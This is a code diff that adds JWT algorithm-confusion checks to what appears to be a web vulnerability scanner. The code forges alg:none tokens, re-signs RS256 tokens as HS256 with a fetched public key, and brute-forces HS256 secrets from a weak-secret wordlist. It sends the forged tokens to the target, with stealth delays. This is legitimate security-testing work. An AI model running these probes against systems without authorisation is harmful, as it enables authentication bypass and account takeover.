@@ -1478,6 +1478,14 @@ try:
 except ImportError:
     _CRYPTO_AVAILABLE = False
 
+# PyJWT is optional — enables JWT algorithm confusion detection
+try:
+    import jwt as _pyjwt
+    import jwt.algorithms as _pyjwt_algs
+    _PYJWT_AVAILABLE = True
+except ImportError:
+    _PYJWT_AVAILABLE = False
+
 # sslyze is optional — provides deep TLS protocol + cipher suite analysis.
 # Falls back to Python's ssl module when not installed.
 try:
@@ -5952,6 +5960,8 @@ def main_crawler(start_url, same_domain_only=False, resume=False, ignore_robots=
                 # Price manipulation — tests checkout/payment endpoints for
                 # client-side price/quantity bypass vulnerabilities
                 check_price_manipulation(url, html)
+                # JWT algorithm confusion — alg:none, RS256→HS256, weak secret
+                check_jwt_confusion(url, html, headers)
             # IDOR candidate detection — runs in background thread with timeout
             # to prevent hung verification requests stalling the crawl
             _idor_thread = threading.Thread(
@@ -10175,6 +10185,370 @@ def check_price_manipulation(page_url: str, html_content) -> None:
 
                 except Exception:
                     pass
+
+
+# ─────────────────────────────────────────────
+# JWT algorithm confusion detection
+# ─────────────────────────────────────────────
+
+# Regex: three base64url segments separated by dots — standard JWT shape
+_JWT_RE = re.compile(
+    r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
+)
+
+# JSON body field names that commonly carry JWTs
+_JWT_BODY_FIELDS = frozenset({
+    "token", "jwt", "access_token", "id_token", "auth_token",
+    "accessToken", "idToken", "authToken",
+})
+
+# Known demo / test tokens to skip (jwt.io example)
+_JWT_DEMO_PREFIXES = (
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
+    ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
+)
+
+# Well-known public-key / JWKS discovery paths
+_JWT_JWKS_PATHS = [
+    "/.well-known/jwks.json",
+    "/.well-known/openid-configuration",
+    "/oauth/token_key",
+    "/api/oauth/token_key",
+]
+
+# Common weak HS256 secrets to try
+_JWT_WEAK_SECRETS = [
+    "secret", "password", "123456", "qwerty", "letmein",
+    "your-256-bit-secret", "your-secret", "mysecret",
+    "jwt-secret", "app-secret", "api-secret", "token-secret",
+    "development", "staging", "production", "test",
+]
+
+_jwt_tested: set = set()   # (host, token_fingerprint) already probed
+
+
+def _jwt_b64_decode(segment: str) -> bytes:
+    """Decode a base64url segment with missing-padding tolerance."""
+    pad = 4 - len(segment) % 4
+    if pad != 4:
+        segment += "=" * pad
+    return __import__("base64").urlsafe_b64decode(segment)
+
+
+def _jwt_b64_encode(data: bytes) -> str:
+    """Encode bytes as unpadded base64url."""
+    return __import__("base64").urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+def _jwt_parse(token: str):
+    """
+    Return (header_dict, payload_dict, header_seg, payload_seg, sig_seg)
+    or None if the token cannot be decoded.
+    """
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        hdr  = json.loads(_jwt_b64_decode(parts[0]))
+        body = json.loads(_jwt_b64_decode(parts[1]))
+        return hdr, body, parts[0], parts[1], parts[2]
+    except Exception:
+        return None
+
+
+def _jwt_build_none_token(header_seg: str, payload_seg: str) -> str:
+    """Craft a token with alg:none and an empty signature."""
+    new_hdr = _jwt_b64_encode(
+        json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()
+    )
+    return f"{new_hdr}.{payload_seg}."
+
+
+def _jwt_probe_request(page_url: str, token: str, domain: str):
+    """
+    Re-issue the same page request with *token* substituted.  Returns the
+    response or None on error.  Sets the token in both Authorization and a
+    generic Cookie header so we hit whichever the server checks.
+    """
+    probe_headers = {
+        **create_request_header(),
+        "Authorization": f"Bearer {token}",
+        "Cookie": f"token={token}; access_token={token}",
+    }
+    try:
+        return _get_session().get(
+            page_url,
+            headers=probe_headers,
+            timeout=8,
+            allow_redirects=True,
+            verify=False,
+        )
+    except Exception:
+        return None
+
+
+def _jwt_accepted(resp) -> bool:
+    """Return True if the server treated the token as valid (not 401/403)."""
+    if resp is None:
+        return False
+    return resp.status_code not in (401, 403)
+
+
+def _jwt_fetch_public_key(base_url: str, domain: str):
+    """
+    Try known JWKS/OpenID paths and return (pem_bytes, source_url) for the
+    first RSA public key found, or (None, None).
+    """
+    if not _CRYPTO_AVAILABLE:
+        return None, None
+    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+    for path in _JWT_JWKS_PATHS:
+        url = base_url.rstrip("/") + path
+        try:
+            stealth_delay(domain)
+            resp = _get_session().get(
+                url, headers=create_request_header(), timeout=8, verify=False
+            )
+            if resp is None or resp.status_code != 200:
+                continue
+
+            # Opportunistic MEDIUM alert: public-key endpoint exposed without auth
+            alert(
+                "JWT PUBLIC KEY ENDPOINT EXPOSED",
+                "MEDIUM",
+                url,
+                f"JWKS/OpenID endpoint accessible without authentication at {url}. "
+                f"Exposes the public key used to verify JWT signatures.",
+            )
+
+            ct = resp.headers.get("Content-Type", "")
+            data = resp.json()
+
+            # /.well-known/openid-configuration → follow jwks_uri
+            if "jwks_uri" in data:
+                jwks_url = data["jwks_uri"]
+                try:
+                    stealth_delay(domain)
+                    r2 = _get_session().get(
+                        jwks_url, headers=create_request_header(), timeout=8, verify=False
+                    )
+                    if r2 and r2.status_code == 200:
+                        data = r2.json()
+                        url  = jwks_url
+                except Exception:
+                    continue
+
+            # Standard JWKS — extract first RSA key
+            for key_obj in data.get("keys", []):
+                if key_obj.get("kty") != "RSA":
+                    continue
+                try:
+                    from cryptography.hazmat.primitives.asymmetric.rsa import (
+                        RSAPublicNumbers,
+                    )
+                    import base64 as _b64
+                    def _b64url_to_int(s):
+                        pad = 4 - len(s) % 4
+                        if pad != 4:
+                            s += "=" * pad
+                        return int.from_bytes(_b64.urlsafe_b64decode(s), "big")
+
+                    n = _b64url_to_int(key_obj["n"])
+                    e = _b64url_to_int(key_obj["e"])
+                    pub = RSAPublicNumbers(e, n).public_key(_crypto_backend())
+                    pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
+                    return pem, url
+                except Exception:
+                    continue
+
+            # /oauth/token_key — Spring-style PEM response
+            if "value" in data and "BEGIN" in str(data.get("value", "")):
+                return data["value"].encode(), url
+
+        except Exception:
+            continue
+    return None, None
+
+
+def check_jwt_confusion(page_url: str, html_content, response_headers: dict) -> None:
+    """
+    JWT algorithm confusion detection.
+
+    Extracts JWT tokens from:
+      - Authorization: Bearer header in the response
+      - Set-Cookie response header values
+      - JSON body fields: token, jwt, access_token, id_token, auth_token
+
+    For each unique token (per host) runs three attack probes:
+
+    1. alg:none attack
+       Replaces the algorithm with "none" and strips the signature.
+       Flags CRITICAL if the server returns non-401/403.
+
+    2. RS256→HS256 confusion (asymmetric tokens only)
+       Fetches the server's public key from JWKS / OpenID endpoints.
+       Signs a new token with HS256 using the raw PEM as the HMAC secret.
+       Flags CRITICAL if accepted.
+
+    3. Weak secret brute-force (HS256 tokens only)
+       Tries a short wordlist of common secrets via PyJWT decode.
+       Flags HIGH on first match; does NOT forge a new request with the cracked
+       token — only reports that the secret is known.
+
+    Detection-only — payload claims are never modified.
+    Deduplicates per (host, token fingerprint).
+    8-second timeout per probe.
+    Only called when --active-probes is enabled.
+    """
+    if not is_in_scope(page_url):
+        return
+    if not _PYJWT_AVAILABLE:
+        return
+    domain = urlparse(page_url).netloc
+    if is_third_party_cdn(domain):
+        return
+
+    base_url = urlparse(page_url).scheme + "://" + domain
+
+    # ── Token extraction ──────────────────────────────────────────────────────
+    candidates: list[str] = []
+
+    hdrs = {k.lower(): v for k, v in response_headers.items()} if response_headers else {}
+
+    # Authorization: Bearer <token>
+    auth_hdr = hdrs.get("authorization", "")
+    if auth_hdr.lower().startswith("bearer "):
+        t = auth_hdr.split(" ", 1)[1].strip()
+        if _JWT_RE.match(t):
+            candidates.append(t)
+
+    # Set-Cookie values
+    for cookie_val in hdrs.get("set-cookie", "").split(";"):
+        for m in _JWT_RE.finditer(cookie_val):
+            candidates.append(m.group(0))
+
+    # JSON body fields
+    if html_content:
+        body_s = (
+            html_content if isinstance(html_content, str)
+            else html_content.decode("utf-8", errors="replace")
+        )
+        # Fast path: look for known field names first
+        for field in _JWT_BODY_FIELDS:
+            for m in re.finditer(
+                r'"' + re.escape(field) + r'"\s*:\s*"(' + _JWT_RE.pattern + r')"',
+                body_s,
+            ):
+                candidates.append(m.group(1))
+        # Fallback: any JWT-shaped value anywhere in the body
+        for m in _JWT_RE.finditer(body_s):
+            candidates.append(m.group(0))
+
+    if not candidates:
+        return
+
+    # ── Deduplicate and skip known demo tokens ────────────────────────────────
+    seen_fps: set = set()
+    for raw_token in candidates:
+        # fingerprint = first 40 chars of header+payload (avoids per-expiry noise)
+        fp_key = raw_token[:raw_token.rfind(".")] if raw_token.count(".") == 2 else raw_token
+        fp_key = fp_key[:80]
+        global_key = (domain, fp_key)
+
+        if global_key in _jwt_tested:
+            continue
+        if any(raw_token.startswith(p) for p in _JWT_DEMO_PREFIXES):
+            continue
+        if fp_key in seen_fps:
+            continue
+        seen_fps.add(fp_key)
+        _jwt_tested.add(global_key)
+
+        parsed = _jwt_parse(raw_token)
+        if parsed is None:
+            continue
+        hdr_dict, payload_dict, hdr_seg, pay_seg, sig_seg = parsed
+        alg = hdr_dict.get("alg", "none").upper()
+
+        print(timestamp() + f" JWT probe: {domain} alg={alg}")
+
+        waf_note = ""
+        waf_vendor = _waf_results.get(domain)
+        if waf_vendor:
+            waf_note = f" [WAF: {waf_vendor} detected]"
+
+        # ── 1. alg:none attack ────────────────────────────────────────────────
+        none_token = _jwt_build_none_token(hdr_seg, pay_seg)
+        resp_none  = _jwt_probe_request(page_url, none_token, domain)
+        if _jwt_accepted(resp_none):
+            alert(
+                "JWT ALGORITHM CONFUSION: alg:none ACCEPTED",
+                "CRITICAL",
+                page_url,
+                f"Server accepted a JWT with alg=none (empty signature) — "
+                f"original algorithm was '{alg}'. The server is not enforcing "
+                f"algorithm validation, allowing full token forgery without a secret.{waf_note}",
+            )
+            print(timestamp() + f" [!!] JWT alg:none accepted on {domain}")
+
+        # ── 2. RS256 → HS256 confusion ────────────────────────────────────────
+        if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512",
+                   "PS256", "PS384", "PS512"):
+            pub_pem, jwks_url = _jwt_fetch_public_key(base_url, domain)
+            if pub_pem:
+                try:
+                    # Sign a new token with HS256 using the raw PEM as the secret
+                    hs256_token = _pyjwt.encode(
+                        payload_dict,
+                        pub_pem,
+                        algorithm="HS256",
+                    )
+                    # PyJWT >= 2 returns str; older returns bytes
+                    if isinstance(hs256_token, bytes):
+                        hs256_token = hs256_token.decode()
+
+                    stealth_delay(domain)
+                    resp_hs = _jwt_probe_request(page_url, hs256_token, domain)
+                    if _jwt_accepted(resp_hs):
+                        alert(
+                            "JWT ALGORITHM CONFUSION: RS256→HS256 ACCEPTED",
+                            "CRITICAL",
+                            page_url,
+                            f"Server accepted a token re-signed with HS256 using the "
+                            f"server's RSA public key as the HMAC secret (key from "
+                            f"{jwks_url}). An attacker can forge arbitrary tokens "
+                            f"using only the public key.{waf_note}",
+                        )
+                        print(timestamp() + f" [!!] JWT RS256→HS256 confusion on {domain}")
+                except Exception:
+                    pass
+
+        # ── 3. Weak secret brute-force (HS* tokens only) ─────────────────────
+        if alg.startswith("HS"):
+            cracked_secret = None
+            for secret in _JWT_WEAK_SECRETS:
+                try:
+                    _pyjwt.decode(
+                        raw_token,
+                        secret,
+                        algorithms=[alg],
+                        options={"verify_exp": False},
+                    )
+                    cracked_secret = secret
+                    break
+                except Exception:
+                    pass
+
+            if cracked_secret is not None:
+                alert(
+                    "JWT WEAK SECRET",
+                    "HIGH",
+                    page_url,
+                    f"HS256 JWT secret cracked from common wordlist — "
+                    f"secret is {cracked_secret!r}. An attacker can forge "
+                    f"arbitrary tokens with full control over all claims.{waf_note}",
+                )
+                print(timestamp() + f" [!!] JWT weak secret '{cracked_secret}' on {domain}")
 
 
 # ─────────────────────────────────────────────
